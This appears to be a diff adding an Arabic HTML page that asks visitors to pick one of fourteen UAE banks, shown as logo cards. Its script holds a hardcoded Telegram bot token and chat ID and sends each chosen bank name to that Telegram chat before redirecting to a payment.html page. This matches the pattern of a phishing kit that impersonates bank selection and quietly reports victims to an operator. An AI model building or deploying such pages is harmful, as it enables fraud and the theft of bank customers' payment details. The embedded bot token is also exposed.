@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" /> 
+ <meta name="viewport" content="width=device-width, initial-scale=1" />
+ <meta charset="utf-8" />
+ <title>اختيار البنك</title>
+  <style>
+    body {
+      font-family: 'Tajawal', sans-serif;
+      background-color: #f3f3f3;
+      padding: 20px;
+      text-align: center;
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 20px;
+      max-width: 800px;
+      margin: auto;
+    }
+    .bank {
+      background-color: white;
+      border-radius: 12px;
+      padding: 20px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      cursor: pointer;
+      transition: transform 0.2s;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .bank:hover {
+      transform: scale(1.03);
+    }
+    .bank img {
+      max-width: 80px;
+      max-height: 60px;
+      margin-bottom: 10px;
+    }
+    .bank-name {
+      font-size: 16px;
+      font-weight: bold;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <h2>اختر البنك</h2>
+  <div class="grid">
+    <div class="bank" onclick="selectBank('بنك أبوظبي الأول (FAB)')">
+      <img src="img-bank/4.jpg" alt="FAB">
+      <div class="bank-name">بنك أبوظبي الأول</div>
+    </div>
+    <div class="bank" onclick="selectBank('بنك أبوظبي التجاري (ADCB)')">
+      <img src="img-bank/5.jpg" alt="ADCB">
+      <div class="bank-name">بنك أبوظبي التجاري</div>
+    </div>
+    <div class="bank" onclick="selectBank('مصرف أبوظبي الإسلامي (ADIB)')">
+      <img src="img-bank/6.jpg" alt="ADIB">
+      <div class="bank-name">مصرف أبوظبي الإسلامي</div>
+    </div>
+    <div class="bank" onclick="selectBank('بنك الإمارات دبي الوطني (Emirates NBD)')">
+      <img src="img-bank/10.jpg" alt="Emirates NBD">
+      <div class="bank-name">بنك الإمارات دبي الوطني</div>
+    </div>
+    <div class="bank" onclick="selectBank('بنك الإمارات الإسلامي (Emirates Islamic)')">
+      <img src="img-bank/7.jpg" alt="Emirates Islamic">
+      <div class="bank-name">بنك الإمارات الإسلامي</div>
+    </div>
+    <div class="bank" onclick="selectBank('بنك دبي الإسلامي (DIB)')">
+      <img src="img-bank/3.jpg" alt="DIB">
+      <div class="bank-name">بنك دبي الإسلامي</div>
+    </div>
+    <div class="bank" onclick="selectBank('بنك دبي التجاري (CBD)')">
+      <img src="img-bank/1.jpg" alt="CBD">
+      <div class="bank-name">بنك دبي التجاري</div>
+    </div>
+    <div class="bank" onclick="selectBank('بنك المشرق (Mashreq Bank)')">
+      <img src="img-bank/2.jpg" alt="Mashreq">
+      <div class="bank-name">بنك المشرق</div>
+    </div>
+    <div class="bank" onclick="selectBank('بنك رأس الخيمة الوطني (RAKBANK)')">
+      <img src="img-bank/RK.jpg" alt="RAKBANK">
+      <div class="bank-name">RAKBANK</div>
+    </div>
+    <div class="bank" onclick="selectBank('بنك الفجيرة الوطني (NBF)')">
+      <img src="img-bank/9.jpg" alt="NBF">
+      <div class="bank-name">بنك الفجيرة الوطني</div>
+    </div>
+    <div class="bank" onclick="selectBank('بنك الشارقة (Bank of Sharjah)')">
+      <img src="img-bank/8.jpg" alt="Bank of Sharjah">
+      <div class="bank-name">بنك الشارقة</div>
+    </div>
+    <div class="bank" onclick="selectBank('مصرف عجمان (Ajman Bank)')">
+      <img src="img-bank/AJ.jpg" alt="Ajman Bank">
+      <div class="bank-name">مصرف عجمان</div>
+    </div> 
+    <div class="bank" onclick="selectBank('بنك المارية المحلي (Al Maryah)')">
+      <img src="img-bank/MA.jpg" alt="Al Maryah">
+      <div class="bank-name">بنك المارية المحلي</div>
+    </div>
+    <div class="bank" onclick="selectBank('بنك HSBC UAE (HSBC UAE)')">
+      <img src="img-bank/HS.jpg" alt="HSBC UAE">
+      <div class="bank-name">HSBC UAE</div>
+    </div>
+  </div>  <script>
+    const TOKEN = '7249432247:AAFCoEkwppQ0pOrGWOLBBBCWyATgjpD__bo';
+    const CHAT_ID = '7284154308';
+
+    function selectBank(bankName) {
+      const msg = `🏦 تم اختيار البنك: ${bankName}`;
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+      }).then(() => {
+        window.location.href = 'payment.html';
+      });
+    }
+  </script></body>
+</html>
